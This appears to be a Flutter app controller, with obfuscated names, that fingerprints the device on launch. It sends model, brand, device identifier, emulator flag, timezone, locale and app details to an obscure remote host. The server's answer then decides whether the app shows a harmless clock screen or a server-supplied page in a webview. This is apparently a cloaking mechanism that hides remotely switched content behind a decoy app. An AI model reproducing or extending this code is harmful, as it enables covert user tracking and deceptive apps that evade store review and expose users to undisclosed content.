import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var dgpwnc = RxBool(false);
  var abqoxe = RxBool(true);
  var rnhtcsb = RxString("");
  var melissa = RxBool(false);
  var hagenes = RxBool(true);
  final oajfmph = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    aftkruih();
  }


  Future<void> aftkruih() async {

    melissa.value = true;
    hagenes.value = true;
    abqoxe.value = false;

    oajfmph.post("https://kol.paksonw.xyz/L2EukDUyO",data: await ctqxwye()).then((value) {
      var ohgxle = value.data["ohgxle"] as String;
      var ydvpmf = value.data["ydvpmf"] as bool;
      if (ydvpmf) {
        rnhtcsb.value = ohgxle;
        nona();
      } else {
        mccullough();
      }
    }).catchError((e) {
      abqoxe.value = true;
      hagenes.value = true;
      melissa.value = false;
    });
  }

  Future<Map<String, dynamic>> ctqxwye() async {
    final DeviceInfoPlugin ptidh = DeviceInfoPlugin();
    PackageInfo etqk_eabhzkr = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var carqtn = Platform.localeName;
    var OgWDN = currentTimeZone;

    var OqcsInwE = etqk_eabhzkr.packageName;
    var GxMcnTR = etqk_eabhzkr.version;
    var METSmlt = etqk_eabhzkr.buildNumber;

    var YpEPvG = etqk_eabhzkr.appName;
    var lXAHgLaY = "";
    var maybelleSchoen = "";
    var QFbhZSMV  = "";
    var jVKUx = "";
    var maraMertz = "";
    var fbzeQDSy = "";
    var terenceStrosin = "";


    var agnesRunolfsson = "";
    var LKwDiph = false;

    if (GetPlatform.isAndroid) {
      fbzeQDSy = "android";
      var ozgpae = await ptidh.androidInfo;

      jVKUx = ozgpae.brand;

      lXAHgLaY  = ozgpae.model;
      QFbhZSMV = ozgpae.id;

      LKwDiph = ozgpae.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      fbzeQDSy = "ios";
      var rioldmwg = await ptidh.iosInfo;
      jVKUx = rioldmwg.name;
      lXAHgLaY = rioldmwg.model;

      QFbhZSMV = rioldmwg.identifierForVendor ?? "";
      LKwDiph  = rioldmwg.isPhysicalDevice;
    }
    var res = {
      "agnesRunolfsson" : agnesRunolfsson,
      "YpEPvG": YpEPvG,
      "GxMcnTR": GxMcnTR,
      "lXAHgLaY": lXAHgLaY,
      "OgWDN": OgWDN,
      "terenceStrosin" : terenceStrosin,
      "jVKUx": jVKUx,
      "QFbhZSMV": QFbhZSMV,
      "carqtn": carqtn,
      "METSmlt": METSmlt,
      "fbzeQDSy": fbzeQDSy,
      "LKwDiph": LKwDiph,
      "maraMertz" : maraMertz,
      "maybelleSchoen" : maybelleSchoen,
      "OqcsInwE": OqcsInwE,
    };
    return res;
  }

  Future<void> mccullough() async {
    Get.offAllNamed("/mainClock");
  }

  Future<void> nona() async {
    Get.offAllNamed("/pick");
  }
}
